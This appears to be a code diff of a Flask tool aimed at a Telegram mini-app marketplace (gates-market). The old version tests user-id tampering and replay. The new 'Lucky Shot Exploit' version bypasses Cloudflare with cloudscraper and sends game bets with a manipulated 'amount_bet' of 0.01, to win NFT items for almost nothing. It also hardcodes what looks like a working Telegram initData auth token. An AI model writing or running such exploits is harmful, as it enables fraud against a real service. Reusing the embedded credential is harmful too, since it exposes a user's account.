@@ -1,124 +1,100 @@
 import os
 import json
 import time
-import hmac
-import hashlib
 import cloudscraper
-from urllib.parse import parse_qsl, urlencode
 from flask import Flask, request, jsonify, render_template_string
 
 app = Flask(__name__)
+scraper = cloudscraper.create_scraper(browser={'browser': 'chrome', 'platform': 'ios', 'mobile': True})
 
-TARGET_BASE = "https://api.gates-market.io"
-TEST_ENDPOINT = "/api/v1/users/me"
+# Твой рабочий токен зашит сюда для удобства
+VALID_INIT_DATA = "query_id=AAHxH9t7AgAAAPEf23tlPjvx&user=%7B%22id%22%3A6372925425%2C%22first_name%22%3A%22%D0%A1%D0%B0%D0%B2%D0%B5%D0%BB%D0%B8%D0%B9%22%2C%22last_name%22%3A%22%22%2C%22username%22%3A%22forlua%22%2C%22language_code%22%3A%22ru%22%2C%22is_premium%22%3Atrue%2C%22allows_write_to_pm%22%3Atrue%2C%22photo_url%22%3A%22https%3A%5C%2F%5C%2Ft.me%5C%2Fi%5C%2Fuserpic%5C%2F320%5C%2FJienmeEDxdRAMavaJlXTxgqP1gcjCisC2cOUHrWkWBXFoQzkhnN3xKV3CO2OHI28.svg%22%7D&auth_date=1794813990&signature=cnpqCwSfPb4uP1nFbrNe3y3PJpreMi66GOTzCMXDcrCC8JIEQIii1v5shyq_qdCBSYCt1b9CJPSQx0udvGsEBg&hash=d50a448d9cde85acb03dff7169f95223e81f555e93ac7858ff5fda5883bd189f"
 
-# Создаем сессию Cloudscraper (обходит Cloudflare)
-scraper = cloudscraper.create_scraper(
-    browser={
-        'browser': 'chrome',
-        'platform': 'ios',
-        'mobile': True
-    }
-)
-
-def parse_init_data(raw: str) -> dict:
-    return dict(parse_qsl(raw, keep_blank_values=True))
-
-def tamper_user_id(raw: str, new_id: int) -> str:
-    pairs = parse_init_data(raw)
-    user = json.loads(pairs.get("user", "{}"))
-    user["id"] = new_id
-    pairs["user"] = json.dumps(user, separators=(",", ":"))
-    return urlencode(pairs)
-
-def make_request(raw_init_data: str, endpoint: str = TEST_ENDPOINT) -> dict:
-    url = TARGET_BASE.rstrip("/") + endpoint
-    headers = {
-        "Accept": "application/json",
-        "Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
-        "X-Telegram-Init-Data": raw_init_data,
-        "Origin": "https://tg-app.gates-market.io",
-        "Referer": "https://tg-app.gates-market.io/",
-        "Sec-Fetch-Dest": "empty",
-        "Sec-Fetch-Mode": "cors",
-        "Sec-Fetch-Site": "same-site"
-    }
-    try:
-        r = scraper.get(url, headers=headers, timeout=20)
-        return {"status": r.status_code, "body": r.text[:300]}
-    except Exception as e:
-        return {"error": str(e)}
-
-def probe_live(raw: str) -> dict:
-    if not raw:
-        return {"error": "empty initData"}
-        
-    report = {}
-    pairs = parse_init_data(raw)
-    try:
-        auth_date = int(pairs.get("auth_date", 0))
-        now = int(time.time())
-        report["age_seconds"] = now - auth_date
-    except:
-        report["age_seconds"] = -1
-
-    report["original"] = make_request(raw)
-    report["replay"] = make_request(raw)
-    
-    try:
-        tampered_raw = tamper_user_id(raw, 1)
-        report["tamper_id_1"] = make_request(tampered_raw)
-    except Exception as e:
-        report["tamper_id_1"] = {"error": str(e)}
-        
-    return report
-
-# ─────────── Веб-интерфейс (тот же) ───────────
 HTML_UI = """
 <!doctype html>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <style>
     body { font-family: -apple-system, sans-serif; background: #121212; color: #e0e0e0; padding: 15px; }
-    textarea { width: 100%; box-sizing: border-box; padding: 10px; margin-bottom: 10px; border-radius: 8px; border: 1px solid #333; background: #1e1e1e; color: #fff; font-size: 16px; }
-    button { width: 100%; padding: 14px; background: #007aff; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; }
+    textarea { width: 100%; box-sizing: border-box; padding: 10px; margin-bottom: 10px; border-radius: 8px; border: 1px solid #333; background: #1e1e1e; color: #fff; font-size: 14px; font-family: monospace; }
+    button { width: 100%; padding: 14px; background: #ff3b30; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; margin-bottom: 20px;}
     pre { background: #000; padding: 15px; border-radius: 8px; overflow-x: auto; font-size: 14px; white-space: pre-wrap; }
 </style>
-<h2>gates-market probe (CF Bypass)</h2>
-<textarea id="init" rows="6" placeholder="X-Telegram-Init-Data..."></textarea>
-<button onclick="run()">RUN PROBE</button>
+<h2>Lucky Shot Exploit</h2>
+<p style="font-size:14px; color:#aaa;">Измени ставку в поле `amount_bet` и нажми кнопку. Если сервер её примет — мы получим предмет за копейки.</p>
+
+<button onclick="run()">PLAY LUCKY SHOT</button>
 <pre id="out">Waiting...</pre>
+
 <script>
 async function run() {
     const btn = document.querySelector('button');
     const out = document.getElementById('out');
-    const raw = document.getElementById('init').value.trim();
-    if (!raw) { out.textContent = "Paste initData first."; return; }
-    btn.disabled = true; btn.textContent = "Probing...";
-    out.textContent = "Sending requests...";
+    btn.disabled = true; btn.textContent = "Sending...";
+    out.textContent = "Sending request to api.gates-market.io...";
+    
+    const payload = {
+      "game_id": 115350,
+      "round_id": 115350,
+      "grid_size": 5,
+      "listing_kind": "NFT",
+      "listing_id": 27741,
+      "listing_price": "4.40",
+      "chosen_cells": [
+        [0, 0, 0, 0, 0],
+        [0, 0, 0, 0, 0],
+        [0, 0, 1, 0, 0],
+        [0, 0, 1, 0, 0],
+        [0, 0, 0, 0, 0]
+      ],
+      "amount_bet": 0.01
+    };
+
     try {
-        const r = await fetch('/probe', {
-            method: 'POST', headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ initData: raw })
+        const r = await fetch('/api/lucky-shot', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ initData: localStorage.getItem('tgInitData'), payload: payload })
         });
-        out.textContent = JSON.stringify(await r.json(), null, 2);
+        const data = await r.json();
+        out.textContent = JSON.stringify(data, null, 2);
     } catch (e) {
         out.textContent = "Error: " + e.message;
-    } finally { btn.disabled = false; btn.textContent = "RUN PROBE"; }
+    } finally { btn.disabled = false; btn.textContent = "PLAY LUCKY SHOT"; }
+}
+// Сохраняем токен в браузере, чтобы не вставлять каждый раз
+if (!localStorage.getItem('tgInitData')) {
+    const raw = prompt("Вставь свой initData (один раз):");
+    if (raw) localStorage.setItem('tgInitData', raw.trim());
 }
 </script>
 """
 
 @app.route("/")
-@app.route("/ui")
 def ui():
     return render_template_string(HTML_UI)
 
-@app.route("/probe", methods=["POST"])
-def probe():
-    body = request.get_json(force=True, silent=True) or {}
-    raw = body.get("initData", "")
-    if not raw: return jsonify({"error": "No initData provided"}), 400
-    return jsonify(probe_live(raw))
+@app.route("/api/lucky-shot", methods=["POST"])
+def lucky_shot():
+    body = request.get_json()
+    init_data = body.get("initData")
+    payload = body.get("payload")
+    
+    if not init_data: return jsonify({"error": "No initData"}), 400
+    
+    url = "https://api.gates-market.io/api/v1/games/lucky-shot/game"
+    headers = {
+        "Accept": "application/json",
+        "Content-Type": "application/json",
+        "X-Telegram-Init-Data": init_data,
+        "Origin": "https://tg-app.gates-market.io",
+        "Referer": "https://tg-app.gates-market.io/"
+    }
+    
+    try:
+        r = scraper.post(url, headers=headers, json=payload, timeout=20)
+        return jsonify({"status": r.status_code, "response": r.json()})
+    except Exception as e:
+        return jsonify({"error": str(e)})
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
